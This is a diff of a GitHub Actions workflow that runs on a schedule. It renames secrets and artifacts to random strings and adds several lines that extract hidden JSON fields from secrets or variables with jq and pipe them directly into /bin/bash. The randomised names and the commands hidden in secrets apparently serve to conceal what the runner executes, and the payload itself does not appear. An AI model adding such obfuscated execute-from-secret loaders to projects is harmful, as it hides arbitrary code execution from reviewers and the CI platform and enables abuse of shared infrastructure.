@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '57 3,9,15,21 * * *'
+    - cron: '49 4,10,16,22 * * *'
 jobs:
   handler:
     runs-on: ubuntu-latest
@@ -12,17 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          gs1566: ${{ secrets.gs1566 }}
+          oge943: ${{ secrets.oge943 }}
         run: |
-          printf '%s' "$gs1566" | jq -r .rlnlu892 | /bin/bash
-          printf '%s' "$tfzox461" | jq -r .sw2 | /bin/bash
-          printf '%s' "$zoat26" | jq -r .tx5 | /bin/bash
-          printf '%s' "$nd21996" | jq -r .bob84748 | /bin/bash
+          printf '%s' "$oge943" | jq -r .kirc270 | /bin/bash
+          echo $s22 | jq -r .w4974 | /bin/bash
+          printf '%s' "$ir163" | jq -r .k046 | /bin/bash
+          echo $bqm9 | jq -r .lnmfu6129 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: Y8sf4y48
+          name: 1e1wv2iw
           path: "*.zip"
           retention-days: 1
